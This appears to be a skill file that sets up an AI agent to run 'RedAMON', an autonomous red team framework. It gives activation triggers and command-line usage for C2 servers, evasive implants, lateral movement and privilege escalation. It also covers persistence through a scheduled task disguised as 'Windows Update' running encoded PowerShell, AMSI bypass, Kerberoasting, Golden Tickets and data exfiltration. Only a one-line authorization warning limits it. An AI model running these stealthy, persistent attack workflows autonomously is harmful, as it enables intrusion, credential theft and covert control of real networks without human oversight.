---
name: redamon-redteam
description: Autonomous red team framework with AI-driven attack simulation, C2 infrastructure automation, and multi-stage compromise workflows
---

# RedAMON - Autonomous Red Team Framework

AI-driven autonomous red team operations with integrated C2 infrastructure, lateral movement automation, and post-exploitation frameworks.

## When to Activate

- User requests "red team automation", "autonomous pentest", "attack simulation"
- Need to run multi-stage red team campaigns with automated pivoting
- Requires C2 infrastructure setup and callback handling
- Needs automated privilege escalation and lateral movement
- Red team assessments requiring stealthy, persistent operations

## Features

### Core Capabilities
- **Autonomous Campaign Engine** - Multi-phase red team operations with goal-oriented AI
- **C2 Infrastructure** - Automated C2 server deployment, redirector setup, implant generation
- **Lateral Movement** - Automated pivot strategies using WMI, WinRM, SMB, RDP
- **Privilege Escalation** - Kernel exploits, service abuse, token manipulation
- **Persistence** - Registry modifications, scheduled tasks, service creation, WMI event consumers
- **Data Exfiltration** - Automated data classification and exfil timing

### Attack Modules
- Initial access vectors (phishing, drive-by, supply chain)
- Credential harvesting (mimikatz-style, LSASS, SAM database)
- Kerberoasting, AS-REP Roasting, Golden Ticket attacks
- BloodHound integration for AD analysis
- Active Directory privilege escalation paths
- Cloud enumeration (AWS, Azure, GCP)

### Integration with systemv2.5 (AntiGravity Security Arsenal)
- Works with ligolo-ng-pivot for network pivoting
- Complements drakben-framework for covert C2
- Uses pentest-reconnaissance for target enumeration
- Integrates with redteam-mcp for tool orchestration
- Supports bot-evasion-stealth for stealth operations

## Installation

```bash
# Clone repository
git clone https://github.com/redamon-sec/redamon.git
cd redamon

# Install dependencies
pip install -r requirements.txt

# Setup C2 server (optional)
python setup/c2_server.py --install

# Verify installation
python redamon.py --version
```

## Usage

### Basic Campaign
```bash
# Start interactive red team session
python redamon.py campaign --target 10.10.10.0/24

# Quick engagement
python redamon.py quick --target 192.168.1.100 --vector phishing
```

### Autonomous Mode
```bash
# Full autonomous red team operation
python redamon.py auto --goal domain-admin \
  --evasion high \
  --persistence strong

# Specific attack path
python redamon.py auto --goal credentials \
  --technique kerberoast \
  --timeout 3600
```

### C2 Infrastructure
```bash
# Deploy C2 server
python redamon.py c2 deploy --profile cowrie \
  --domain redteam.local \
  --redirector 10.10.10.5

# Generate implant
python redamon.py c2 implant --os windows \
  --architecture x64 \
  --obfuscation sandbox-evasion

# Start listener
python redamon.py c2 listen --port 443 \
  --protocol https
```

### Lateral Movement
```bash
# Automated pivot discovery
python redamon.py pivot discover --target 10.10.10.5

# Execute lateral movement
python redamon.py pivot execute \
  --technique wmi \
  --target 10.10.10.15 \
  --payload shellcode.bin

# Pivot through multiple hosts
python redamon.py pivot chain \
  --hosts 10.10.10.5,10.10.10.10,10.10.10.20
```

### Privilege Escalation
```bash
# Scan for escalation paths
python redamon.py privesc scan --target 10.10.10.5

# Exploit found vulnerability
python redamon.py privesc exploit --vulnerability printspooler

# Automated token manipulation
python redamon.py privesc token --technique steal \
  --target-domain DOMAIN
```

### Persistence
```bash
# Install persistence mechanisms
python redamon.py persist install --methods registry,task,service

# WMI event consumer persistence
python redamon.py persist wmi --trigger logon

# Scheduled task creation
python redamon.py persist scheduled-task \
  --name "Windows Update" \
  --action "powershell -enc ..."
```

### AD Attacks
```bash
# BloodHound collection (via integration)
python redamon.py ad bloodhound --user Administrator

# Kerberoasting
python redamon.py ad kerberoast --spn all

# Golden Ticket generation
python redamon.py ad golden-ticket \
  --domain DOMAIN.local \
  --krbtgt-hash HASH
```

## Configuration

### RedAMON Config (~/.redamon/config.yaml)
```yaml
c2:
  server: 10.10.10.1
  port: 4444
  profile: default
  
evasion:
  level: high
  sandbox-evasion: true
  amsi-bypass: true
  
modules:
  enabled:
    - c2
    - pivoting
    - privesc
    - persistence
    - ad-attacks
    
reporting:
  output: json
  verbose: true
```

## Environment Variables

- `REDAMON_CONFIG` - Path to config file
- `REDAMON_C2_KEY` - C2 encryption key
- `REDAMON_REPORT_DIR` - Output directory for reports

## Output Format

Results are saved as JSON with detailed attack timeline:
```json
{
  "campaign_id": "abc123",
  "target": "10.10.10.0/24",
  "phase": "post-exploitation",
  "actions": [
    {
      "timestamp": "2026-04-10T10:30:00Z",
      "action": "pivot",
      "technique": "wmiexec",
      "result": "success",
      "new_host": "10.10.10.15"
    }
  ],
  "loot": {
    "credentials": 5,
    "domains": 2,
    "total_hosts": 12
  }
}
```

## Safety & Legal

⚠️ **WARNING**: RedAMON is a red team tool. Only use on systems you own or have explicit written authorization for. Unauthorized access is illegal.

## See Also

- [ligolo-ng-pivot](skills/ligolo-ng-pivot/SKILL.md) - Network pivoting
- [drakben-framework](skills/drakben-framework/SKILL.md) - Covert C2 operations
- [pentest-reconnaissance](skills/pentest-reconnaissance/SKILL.md) - Target enumeration
- [bot-evasion-stealth](skills/bot-evasion-stealth/SKILL.md) - Stealth operations